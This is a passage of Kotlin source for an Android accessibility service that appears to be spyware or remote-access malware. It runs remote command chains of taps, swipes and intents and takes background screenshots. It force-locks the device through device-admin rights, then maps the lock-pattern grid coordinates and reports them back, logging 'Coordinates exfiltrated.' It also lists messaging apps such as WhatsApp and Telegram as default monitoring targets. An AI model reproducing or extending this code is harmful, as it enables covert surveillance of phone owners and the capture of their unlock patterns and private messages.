                            else -> 0
                        }
                        if (actionCode == 0) {
                            DebugLogger.log("CHAIN_NAV_ERR", "Unknown nav action: $value")
                            false
                        } else {
                            val res = performGlobalAction(actionCode)
                            DebugLogger.log("CHAIN_NAV", "Nav $value executed: $res")
                            res
                        }
                    }
                    "TAP" -> {
                        val coords = value.split("|", ",")
                        if (coords.size >= 2) {
                            dispatchClick(coords[0].toFloat(), coords[1].toFloat())
                        } else {
                            DebugLogger.log("CHAIN_TAP_ERR", "Invalid coordinates: $value")
                            false
                        }
                    }
                    "NODE" -> {
                        val root = rootInActiveWindow
                        val nodes = root?.findAccessibilityNodeInfosByViewId(value)
                        val node = nodes?.firstOrNull() ?: root?.findAccessibilityNodeInfosByText(value)?.firstOrNull()
                        if (node != null) {
                            val bounds = android.graphics.Rect()
                            node.getBoundsInScreen(bounds)
                            DebugLogger.log("CHAIN_NODE", "Found node '$value' at ${bounds.exactCenterX()}, ${bounds.exactCenterY()}")
                            dispatchClick(bounds.centerX().toFloat(), bounds.centerY().toFloat())
                        } else {
                            DebugLogger.log("CHAIN_NODE_ERR", "Node '$value' not found in active window")
                            false
                        }
                    }
                    "SWIPE" -> {
                        val p = value.split("|", ",")
                        if (p.size >= 4) {
                            dispatchGesturePath(listOf(Pair(p[0].toFloat(), p[1].toFloat()), Pair(p[2].toFloat(), p[3].toFloat())), p.getOrNull(4)?.toLongOrNull() ?: 300L)
                        } else {
                            DebugLogger.log("CHAIN_SWIPE_ERR", "Invalid swipe coords: $value")
                            false
                        }
                    }
                    "PATH" -> {
                        val p = value.split("|", ",")
                        if (p.size >= 4) {
                            val points = mutableListOf<Pair<Float, Float>>()
                            val hasDuration = p.size % 2 != 0
                            val limit = if (hasDuration) p.size - 1 else p.size
                            for (j in 0 until limit step 2) {
                                points.add(Pair(p[j].toFloat(), p[j+1].toFloat()))
                            }
                            val duration = if (hasDuration) p.last().toLongOrNull() ?: 1000L else 1000L
                            dispatchGesturePath(points, duration)
                        } else {
                            DebugLogger.log("CHAIN_PATH_ERR", "Invalid path coords. Need pairs of X,Y: $value")
                            false
                        }
                    }
                    "INTENT" -> {
                        try {
                            val json = JSONObject(value)
                            val intent = android.content.Intent(json.optString("action", android.content.Intent.ACTION_VIEW))
                            val dataStr = json.optString("data", "")
                            if (dataStr.isNotEmpty()) {
                                val safeData = if (dataStr.startsWith("tel:", ignoreCase = true)) dataStr.replace("#", "%23") else dataStr
                                intent.data = android.net.Uri.parse(safeData)
                            }
                            if (json.has("pkg")) intent.setPackage(json.getString("pkg"))
                            val typeStr = json.optString("type", "")
                            if (typeStr.isNotEmpty()) {
                                if (intent.data != null) intent.setDataAndType(intent.data, typeStr)
                                else intent.type = typeStr
                            }
                            val extras = json.optJSONObject("extras")
                            extras?.keys()?.forEach { key ->
                                val v = extras.get(key)
                                if (v is Boolean) intent.putExtra(key, v)
                                else if (v is Int) intent.putExtra(key, v)
                                else intent.putExtra(key, v.toString())
                            }
                            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                            val target = json.optString("target", "activity").lowercase()
                            when (target) {
                                "service" -> { if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent) }
                                "broadcast" -> sendBroadcast(intent)
                                else -> startActivity(intent)
                            }
                            true
                        } catch (e: Exception) {
                            DebugLogger.log("CHAIN_INTENT_ERR", e.toString())
                            false
                        }
                    }
                    else -> {
                        DebugLogger.log("CHAIN_ERR", "Unknown step type: $type")
                        false
                    }
                }
            } catch (e: Exception) {
                DebugLogger.log("CHAIN_EXC", "Exception in step $i: ${e.message}")
                false
            }
            
            DebugLogger.log("CHAIN_RESULT", "Step $i result: ${if(success) "SUCCESS" else "FAILED"}")
            report.append("Step $i ($type): ${if(success) "OK" else "FAIL"}; ")
        }
        DebugLogger.log("CHAIN_END", "Chain execution finished. Report: $report")
        return report.toString()
    }

        private suspend fun dispatchClick(x: Float, y: Float): Boolean {
        val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        val km = getSystemService(Context.KEYGUARD_SERVICE) as android.app.KeyguardManager
        
        DebugLogger.log("GHOST_DEBUG", "Attempting Tap at [$x, $y] | Screen: ${pm.isInteractive} | Locked: ${km.isKeyguardLocked}")

        val path = android.graphics.Path()
        path.moveTo(x, y)
        // BUGFIX: Move 1 pixel down and to the right to prevent native Gesture Recognizer math from hanging on perfectly overlapping lines
        path.lineTo(x + 1f, y + 1f)

        val builder = android.accessibilityservice.GestureDescription.Builder()
        builder.addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, 50)) // 50ms is clean and fast for a standard tap
        
        val deferred = CompletableDeferred<Boolean>()
        try {
            val dispatched = dispatchGesture(builder.build(), object : android.accessibilityservice.AccessibilityService.GestureResultCallback() {
                override fun onCompleted(gestureDescription: android.accessibilityservice.GestureDescription?) {
                    DebugLogger.log("GHOST", "Gesture confirmed by OS at $x,$y")
                    deferred.complete(true)
                }
                override fun onCancelled(gestureDescription: android.accessibilityservice.GestureDescription?) {
                    DebugLogger.log("GHOST_ERR", "Gesture REJECTED by OS. Check if screen is locked or overlapping system UI.")
                    deferred.complete(false)
                }
            }, null) // Passing null forces it automatically onto the main service thread
            
            if (!dispatched) {
                DebugLogger.log("GHOST_ERR", "dispatchGesture returned false immediately.")
                deferred.complete(false)
            }
        } catch (e: Exception) {
            DebugLogger.log("GHOST_FATAL", "Gesture Dispatch Failed: ${e.message}")
            deferred.complete(false)
        }
        
        // Wait for OS callback, but safeguard against infinite hang if OS drops the event
        val result = withTimeoutOrNull(2000) { deferred.await() }
        if (result == null) {
            DebugLogger.log("GHOST_TIMEOUT", "OS dropped the gesture event silently (Timeout after 2000ms)")
            return false
        }
        return result
    }

    private suspend fun dispatchGesturePath(points: List<Pair<Float, Float>>, dur: Long): Boolean {
        val path = android.graphics.Path()
        val start = points.first()
        path.moveTo(start.first, start.second)
        
        points.drop(1).forEach { (x, y) ->
            path.lineTo(x, y)
        }

        val builder = android.accessibilityservice.GestureDescription.Builder()
        builder.addStroke(android.accessibilityservice.GestureDescription.StrokeDescription(path, 0, dur))
        
        val deferred = CompletableDeferred<Boolean>()
        try {
            val dispatched = dispatchGesture(builder.build(), object : android.accessibilityservice.AccessibilityService.GestureResultCallback() {
                override fun onCompleted(gestureDescription: android.accessibilityservice.GestureDescription?) {
                    DebugLogger.log("GHOST", "Gesture Path Completed")
                    deferred.complete(true)
                }
                override fun onCancelled(gestureDescription: android.accessibilityservice.GestureDescription?) {
                    DebugLogger.log("GHOST_ERR", "Gesture Cancelled by System")
                    deferred.complete(false)
                }
            }, Handler(Looper.getMainLooper()))
            
            if (!dispatched) deferred.complete(false)
        } catch (e: Exception) {
            DebugLogger.log("GHOST_FATAL", e.message ?: "Unknown")
            deferred.complete(false)
        }
        
        return withTimeoutOrNull(dur + 2000) { deferred.await() } ?: false
    }

    suspend fun executeMapGridSequence(cmdId: Int, depth: Int) {
        DebugLogger.log("MAP_GRID", "Starting grid discovery sequence...")
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
        val adminComponent = android.content.ComponentName(this, MyDeviceAdminReceiver::class.java)
        
        // 1. FORCE LOCK
        if (dpm.isAdminActive(adminComponent)) {
            dpm.lockNow()
            delay(2000) // Wait for screen to fully settle
        } else {
            CommandProcessor.updateCommandStatus(applicationContext, cmdId, "FAILED_ADMIN", "Device Admin not active")
            return
        }

        // 2. WAKE
        val intent = Intent("WAKE").apply { putExtra("val", "standard") }
        // Re-use internal dispatcher logic via a synthetic call or just call the NAV/WAKE block
        // For reliability, we trigger the WAKE step manually:
        val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        val wakeLock = pm.newWakeLock(android.os.PowerManager.FULL_WAKE_LOCK or android.os.PowerManager.ACQUIRE_CAUSES_WAKEUP or android.os.PowerManager.ON_AFTER_RELEASE, "Cortex:GridWake")
        wakeLock.acquire(3000)
        val pulseIntent = android.content.Intent(applicationContext, PulseActivity::class.java).apply {
            addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_NO_USER_ACTION or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT)
            putExtra("is_wake_trigger", true)
        }
        startActivity(pulseIntent)
        delay(1200)

        // 3. SWIPE UP (To show Pattern View)
        val metrics = resources.displayMetrics
        val centerX = metrics.widthPixels / 2f
        val bottom = metrics.heightPixels * 0.9f
        val top = metrics.heightPixels * 0.2f
        dispatchGesturePath(listOf(Pair(centerX, bottom), Pair(centerX, top)), 400)
        delay(1000)

        // 4. SCRAPE & MATH
        val root = rootInActiveWindow
        val tree = serializeNode(root, 0, depth)
        val result = JSONObject()
        
        fun findPatternNode(node: JSONObject?): JSONObject? {
            if (node == null) return null
            if (node.optString("id").contains("lockPatternView", ignoreCase = true)) return node
            val children = node.optJSONArray("children")
            if (children != null) {
                for (i in 0 until children.length()) {
                    val found = findPatternNode(children.getJSONObject(i))
                    if (found != null) return found
                }
            }
            return null
        }

        val patternNode = findPatternNode(tree)
        if (patternNode != null) {
            val boundsStr = patternNode.getString("bounds")
            val b = boundsStr.split(",").map { it.toInt() }
            val L = b[0]; val T = b[1]; val R = b[2]; val B = b[3]
            val W = R - L; val H = B - T
            
            val grid = JSONObject()
            for (row in 1..3) {
                for (col in 1..3) {
                    val dotX = L + (W * (2 * col - 1) / 6)
                    val dotY = T + (H * (2 * row - 1) / 6)
                    grid.put("dot_${(row-1)*3 + col}", "$dotX,$dotY")
                }
            }
            
            result.put("grid_coordinates", grid)
            result.put("view_bounds", boundsStr)
            result.put("screen_res", "${metrics.widthPixels}x${metrics.heightPixels}")
            CommandProcessor.updateCommandStatus(applicationContext, cmdId, "MAP_SUCCESS", null, result, null)
            DebugLogger.log("MAP_GRID", "Success. Coordinates exfiltrated.")
        } else {
            result.put("raw_tree_snapshot", tree)
            CommandProcessor.updateCommandStatus(applicationContext, cmdId, "MAP_FAILED", "lockPatternView not found in tree", result, null)
            DebugLogger.log("MAP_GRID", "Failed: Pattern view not found.")
        }
    }

    fun captureScreenshot(quality: Int, callback: (java.io.File?) -> Unit) {
        if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.R) {
            DebugLogger.log("SCREENSHOT_ERR", "API 30+ required for background screenshot.")
            callback(null)
            return
        }

        takeScreenshot(android.view.Display.DEFAULT_DISPLAY, applicationContext.mainExecutor, object : AccessibilityService.TakeScreenshotCallback {
            override fun onSuccess(screenshot: ScreenshotResult) {
                try {
                    val bitmap = android.graphics.Bitmap.wrapHardwareBuffer(screenshot.hardwareBuffer, screenshot.colorSpace)
                    if (bitmap == null) { callback(null); return }
                    
                    val file = java.io.File(cacheDir, "scrn_${System.currentTimeMillis()}.jpg")
                    java.io.FileOutputStream(file).use { out ->
                        bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, quality, out)
                    }
                    screenshot.hardwareBuffer.close()
                    callback(file)
                } catch (e: Exception) {
                    DebugLogger.log("SCREENSHOT_ERR", "Processing failed: ${e.message}")
                    callback(null)
                }
            }
            override fun onFailure(errorCode: Int) {
                DebugLogger.log("SCREENSHOT_ERR", "System denied capture. Error code: $errorCode")
                callback(null)
            }
        })
    }

    private fun getDefaultRules(): JSONObject {
        val defaults = JSONObject()
        val apps = listOf("com.google.android.apps.messaging", "com.samsung.android.messaging", "com.whatsapp", "org.telegram.messenger", "org.telegram.plus", "com.imo.android.imoim", "com.imo.android.imoimlite", "com.imo.android.imoimbeta", "com.imo.android.imoimhd", "com.truecaller", "com.android.chrome", "com.facebook.orca", "com.instagram.android")
        for (app in apps) defaults.put(app, JSONObject())
        return defaults
    }
}
